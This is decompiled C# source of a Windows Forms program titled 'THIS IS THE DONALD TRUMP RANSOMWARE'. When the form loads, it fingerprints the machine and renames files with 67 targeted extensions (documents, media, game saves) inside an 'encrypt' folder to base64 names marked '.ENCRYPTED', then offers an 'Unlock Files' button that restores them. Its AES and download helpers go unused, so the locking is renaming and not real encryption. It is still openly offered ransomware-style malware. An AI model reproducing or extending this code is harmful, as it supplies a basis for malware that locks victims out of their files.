using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using CRPT_TRX.My;
using CRPT_TRX.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace CRPT_TRX;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("REMOVER")]
	private Timer _REMOVER;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	private int _am;

	private string hwid;

	private string Cryptpath;

	private string[] Files;

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer REMOVER
	{
		[DebuggerNonUserCode]
		get
		{
			return _REMOVER;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = REMOVER_Tick;
			if (_REMOVER != null)
			{
				_REMOVER.remove_Tick(eventHandler);
			}
			_REMOVER = value;
			if (_REMOVER != null)
			{
				_REMOVER.add_Tick(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		hwid = "";
		Cryptpath = "encrypt\\";
		Files = new string[67]
		{
			".zip", ".mp3", ".7z", ".rar", ".wma", ".avi", ".wmv", ".csv", ".tax", ".sidn",
			".itl", ".mdbackup", ".menu", ".icarus", ".litemod", ".sav", ".lvl", ".raw", ".flv", ".m3u",
			".xxx", ".pak", ".jpg", ".png", ".docx", ".doc", ".ppt", ".odt", ".csv", ".jpeg",
			".psd", ".rtf", ".cfg", "Minecraft", "alts.json", ".wolfram", ".dat", ".dat_mcr", ".mca", ".Ink",
			".pub", ".pptx", ".php", ".html", ".yml", ".sk", ".txt", ".mp4", ".vb", ".swf",
			".ico", ".xcf", "bukkit.jar", ".log", ".sln", ".ini", ".dll", ".xml", ".tex", ".assets",
			".resource", ".java", ".js", ".css", ".gif", "", ""
		};
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_02f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Expected O, but got Unknown
		components = new Container();
		Label3 = new Label();
		ListBox1 = new ListBox();
		Label1 = new Label();
		Button1 = new Button();
		Label2 = new Label();
		TextBox1 = new TextBox();
		REMOVER = new Timer(components);
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label3.set_AutoSize(true);
		((Control)Label3).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)Label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.LawnGreen);
		Label label = Label3;
		Point location = new Point(9, 139);
		((Control)label).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label2 = Label3;
		Size size = new Size(109, 13);
		((Control)label2).set_Size(size);
		((Control)Label3).set_TabIndex(1);
		Label3.set_Text("Encrypted Files: 0");
		ListBox1.set_BackColor(SystemColors.InactiveCaptionText);
		ListBox1.set_ForeColor(Color.LawnGreen);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		location = new Point(12, 155);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(707, 264);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(2);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.LawnGreen);
		Label label3 = Label1;
		location = new Point(-2, 7);
		((Control)label3).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label4 = Label1;
		size = new Size(45, 13);
		((Control)label4).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("HWID:");
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_ForeColor(Color.LawnGreen);
		Button button = Button1;
		location = new Point(633, 12);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(86, 39);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(4);
		((ButtonBase)Button1).set_Text("Unlock Files");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(SystemColors.ActiveCaptionText);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.LawnGreen);
		Label label5 = Label2;
		location = new Point(389, 12);
		((Control)label5).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label6 = Label2;
		size = new Size(132, 13);
		((Control)label6).set_Size(size);
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("STATUS: Files locked");
		((TextBoxBase)TextBox1).set_BackColor(SystemColors.InactiveCaptionText);
		((TextBoxBase)TextBox1).set_ForeColor(Color.LawnGreen);
		TextBox textBox = TextBox1;
		location = new Point(49, 4);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox textBox2 = TextBox1;
		size = new Size(257, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(6);
		REMOVER.set_Interval(1);
		PictureBox1.set_Image((Image)(object)Resources.imgres);
		PictureBox pictureBox = PictureBox1;
		location = new Point(343, 7);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(231, 145);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(9);
		PictureBox1.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveCaptionText);
		size = new Size(731, 429);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)ListBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("THIS IS THE DONALD TRUMP RANSOMWARE");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string downloadString(string url)
	{
		using WebClient webClient = new WebClient();
		webClient.Headers["User-Agent"] = "vb.net";
		return webClient.DownloadString(url);
	}

	public string AES_Encrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
			byte[] bytes = Encoding.ASCII.GetBytes(input);
			text = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string AES_Decrypt(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string result = default(string);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array2 = Convert.FromBase64String(input);
			text = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public string Decrypt(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		directoryInfo.GetFiles();
		DirectoryInfo directoryInfo2 = new DirectoryInfo(path);
		foreach (FileInfo item in directoryInfo2.EnumerateFiles("*.*", SearchOption.AllDirectories))
		{
			if (item.FullName.ToString().Contains(".ENCRYPTED"))
			{
				string text = item.Directory!.ToString() + "\\";
				string name = item.get_Name();
				string text2 = name;
				text2 = text2.Replace(".ENCRYPTED", "");
				byte[] bytes = Convert.FromBase64String(text2);
				string text3 = Encoding.UTF8.GetString(bytes).ToString();
				try
				{
					FileSystem.Rename(text.ToString() + name.ToString(), text.ToString() + text3.ToString());
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		_am = ListBox1.get_Items().get_Count();
		REMOVER.Start();
		string result = default(string);
		return result;
	}

	private void REMOVER_Tick(object sender, EventArgs e)
	{
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			_am -= 10;
			Label3.set_Text("Encrypted Files: " + _am);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			ListBox1.get_Items().RemoveAt(0);
			if (_am <= 20)
			{
				REMOVER.Stop();
				Label3.set_Text("Encrypted Files: 0");
				ListBox1.get_Items().Clear();
				Interaction.MsgBox((object)"Completed! All Files recovered!", (MsgBoxStyle)0, (object)null);
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public string Encrypt(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		directoryInfo.GetFiles();
		DirectoryInfo directoryInfo2 = new DirectoryInfo(path);
		using (IEnumerator<FileInfo> enumerator = directoryInfo2.EnumerateFiles("*.*", SearchOption.AllDirectories).GetEnumerator())
		{
			_Closure_0024__1 closure_0024__ = default(_Closure_0024__1);
			while (enumerator.MoveNext())
			{
				closure_0024__ = new _Closure_0024__1(closure_0024__);
				closure_0024__._0024VB_0024Local_currentFile = enumerator.Current;
				if (!closure_0024__._0024VB_0024Local_currentFile.FullName.ToString().Contains(".ENCRYPTED"))
				{
					if (Files.Any(closure_0024__._Lambda_0024__1))
					{
						string text = closure_0024__._0024VB_0024Local_currentFile.Directory!.ToString() + "\\";
						string name = closure_0024__._0024VB_0024Local_currentFile.get_Name();
						byte[] bytes = Encoding.UTF8.GetBytes(name);
						try
						{
							FileSystem.Rename(text + name, text + Convert.ToBase64String(bytes) + ".ENCRYPTED");
							ListBox1.get_Items().Add((object)(text + name));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
				}
				else if (closure_0024__._0024VB_0024Local_currentFile.FullName.Contains("C:\\"))
				{
					ListBox1.get_Items().Add((object)closure_0024__._0024VB_0024Local_currentFile.FullName);
				}
				else
				{
					ListBox1.get_Items().Add((object)(path + "\\" + closure_0024__._0024VB_0024Local_currentFile.FullName));
				}
			}
		}
		Label3.set_Text("Encrypted Files: " + ListBox1.get_Items().get_Count());
		string result = default(string);
		return result;
	}

	public string MD5StringHash(string strString)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		string text = "";
		string text2 = "";
		byte[] bytes = Encoding.ASCII.GetBytes(strString);
		byte[] array = mD5CryptoServiceProvider.ComputeHash(bytes);
		checked
		{
			int num = array.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				text2 = Conversion.Hex(array[num2]);
				if (Strings.Len(text2) == 1)
				{
					text2 = "0" + text2;
				}
				text += text2;
				num2++;
			}
			return text;
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		hwid += "0";
		hwid += WindowsIdentity.GetCurrent().User!.Value.ToString();
		hwid += "1";
		hwid += ((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory();
		hwid += "2";
		hwid += ((ServerComputer)MyProject.Computer).get_Info().get_TotalVirtualMemory();
		hwid += "3";
		hwid = MD5StringHash(hwid);
		TextBox1.set_Text(hwid);
		Encrypt(Cryptpath);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Label2.set_Text("STATUS: Unlocking files...");
		Decrypt(Cryptpath);
		Label2.set_Text("STATUS: Files unlocked");
	}
}
